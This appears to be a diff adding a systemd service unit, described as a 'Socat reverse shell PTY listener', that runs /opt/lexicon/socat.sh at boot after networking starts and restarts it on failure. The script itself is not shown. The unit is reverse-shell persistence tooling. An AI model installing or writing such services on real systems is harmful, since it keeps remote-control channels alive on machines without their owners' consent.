@@ -1,0 +1,18 @@
+[Unit]
+Description=Socat reverse shell PTY listener
+# Begin after networking is up
+After=network.target
+Wants=network.target
+
+[Service]
+Type=simple
+WorkingDirectory=/opt/lexicon
+# Run as user, execute socat.sh
+ExecStart=/opt/lexicon/socat.sh
+Restart=on-failure
+RestartSec=2
+StandardOutput=journal
+StandardError=journal
+
+[Install]
+WantedBy=multi-user.target
